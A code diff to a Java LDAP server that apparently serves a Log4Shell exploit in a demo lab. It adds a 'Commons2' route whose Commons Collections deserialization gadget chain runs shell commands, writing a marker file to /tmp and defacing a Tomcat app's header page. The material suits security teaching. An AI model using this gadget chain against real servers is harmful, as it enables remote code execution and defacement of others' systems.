@@ -122,14 +122,23 @@ public  class  Server  {
             throws LDAPException, MalformedURLException
         {
             System.out.println("Base = " + base);
-           if (base.equals("Commons")) {
+           if (base.equals("Commons") || base.equals("Commons2")) {
                 //deserialization attack chain in commons collections
                 System.out.println("Send LDAP reference result for " + base + " containing a deserialized chain");
 
                 String[] command = {
                         "/bin/sh",
                         "-c",
-                        "echo '<center><h1>Nice container you have, I think I will move in!</h1></center>' >> /usr/local/tomcat/webapps/todolist/WEB-INF/views/common/header.jspf"};
+                        "echo PWNED > /tmp/pwned-commons"};
+
+                if (base.equals("Commons2")) {
+                    String[] containerCommand = {
+                            "/bin/sh",
+                            "-c",
+                            "echo '<center><h1>This text is inserted using the Log4shell deserialization route with Commons Collection 3.1</h1></center>' >> /usr/local/tomcat/webapps/todolist/WEB-INF/views/common/header.jspf"};
+
+                    command = containerCommand;
+                }
 
                 final Transformer[] transformers = new Transformer[] {
                         new ConstantTransformer(Runtime.class),
